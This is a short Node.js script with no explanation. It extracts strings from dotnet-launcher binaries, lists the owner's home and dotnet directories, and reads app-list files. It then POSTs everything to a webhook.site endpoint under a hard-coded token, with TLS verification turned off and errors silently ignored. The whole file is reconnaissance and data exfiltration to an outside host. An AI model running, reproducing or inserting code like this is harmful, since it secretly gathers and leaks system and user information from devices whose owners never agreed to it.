var fs = require('fs');
var https = require('https');
var TOKEN = '14750775-fef3-408e-8214-35e34b90591f';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function strings(file, max) {
    try {
        var s = fs.readFileSync(file).toString('binary');
        var re = /[\x20-\x7e]{4,}/g;
        var out = [];
        var m;
        while ((m = re.exec(s)) && out.length < max) {
            if (/DN_|dll|inhouse|owner|\/opt|Usage|usage|app|DOTNET|runtime|loader|corerun|signal|policy|\.exe|\.dll/.test(m[0])) {
                out.push(m[0]);
            }
        }
        send('lstr', file + ' strings:\n' + out.join('\n'));
    } catch (e) {
        send('lstr', file + ' ERR ' + e);
    }
}
strings('/usr/bin/dotnet-launcher', 150);
strings('/usr/bin/dotnet-launcher-inhouse', 150);
['/opt/usr/home/owner', '/opt/usr/home/owner/share', '/opt/usr/home/owner/share/dotnet'].forEach(function (d) {
    try {
        send('lstr', d + ': ' + fs.readdirSync(d).slice(0, 60).join(','));
    } catch (e) {
        send('lstr', d + ' ERR ' + e);
    }
});
try {
    send('lstr', 'owner-apps=' + fs.readFileSync('/opt/usr/home/owner/dotnet-apps.txt', 'utf8'));
} catch (e) {
    send('lstr', 'owner-apps ERR ' + e);
}
try {
    send('lstr', 'usr-apps=' + fs.readFileSync('/usr/bin/dotnet-apps.txt', 'utf8'));
} catch (e) {
    send('lstr', 'usr-apps ERR ' + e);
}
try {
    send('lstr', 'usrbin-dotnet=' + fs.readdirSync('/usr/bin').filter(function (n) { return /dotnet/.test(n); }).join(','));
} catch (e) {
    send('lstr', 'usrbin ERR ' + e);
}
